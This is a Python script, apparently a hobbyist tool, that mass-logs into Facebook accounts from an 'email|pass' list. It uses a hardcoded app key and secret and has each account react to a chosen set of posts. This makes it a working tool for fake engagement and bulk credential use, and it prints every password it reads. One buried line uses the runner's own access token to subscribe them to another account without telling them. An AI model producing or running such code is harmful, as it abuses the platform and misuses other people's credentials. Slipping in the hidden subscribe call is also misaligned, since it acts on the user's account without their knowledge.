#!usr/bin/python3.7
#Author: KANG-NEWBIE
#Contact: t.me/kang_nuubi
#github: github.com/kang-newbie
'''
recode? oke, but don't deleted name author
'''
try:
  import requests, sys, os, time, json, hashlib

  class alike():
    def get(self,id,pas):
      try:
        global res
        API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pas,"return_ssl_resources":"0","v":"1.0"};sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pas+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
        x = hashlib.new('md5')
        x.update(sig)
        data.update({'sig':x.hexdigest()})
        requ=requests.get('https://api.facebook.com/restserver.php',params=data)
        res=requ.json()['access_token']
      except KeyError: pass

    def react(self,id,act):
      try:
        par={'access_token':res,'type':act}
        reeq=requests.post('https://graph.facebook.com/v3.2/'+id+'/reactions',data=par)
        if 'success' in str(reeq.text):
          print("[+] post id - "+id+" [success]")
        else: print("[-] post id - "+id+" [failed]")
      except: pass

  ket=open('toket/token.txt','r').read()
  req=requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(10)&access_token='+ket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+ket)
  sul=json.loads(req.text)

  print("""
\t[Mass Auto Reactions]
\t   [By:KANG-NEWBIE]
""")
  print("[INFO] List sparator 'email|pass'")
  inp=input("[+] list account: ")
  file=open(inp,'r').read().splitlines()

  print("""
	[REACT]
1.Like		4.Wow
2.Love		5.Sad
3.Haha		6.Angry""")
  pilih=int(input("$ react_> "))
  if pilih == 1:
    act='LIKE'
  elif pilih == 2:
    act='LOVE'
  elif pilih == 3:
    act='HAHA'
  elif pilih == 4:
    act='WOW'
  elif pilih == 5:
    act='SAD'
  elif pilih == 6:
    act='ANGRY'
  else: exit("[?] are you stupid")

  for x in file:
    p=x.split('|')
    id=p[0]
    pas=p[1]
    alike().get(id,pas)
    print("[!] react with account ["+id+"|"+pas+"]")
    for i in sul['feed']['data']:
      alike().react(i['id'],act)

except KeyboardInterrupt: exit("[!] Key interrupt: exit")
except Exception as F: print("[Err] %s"%(F))
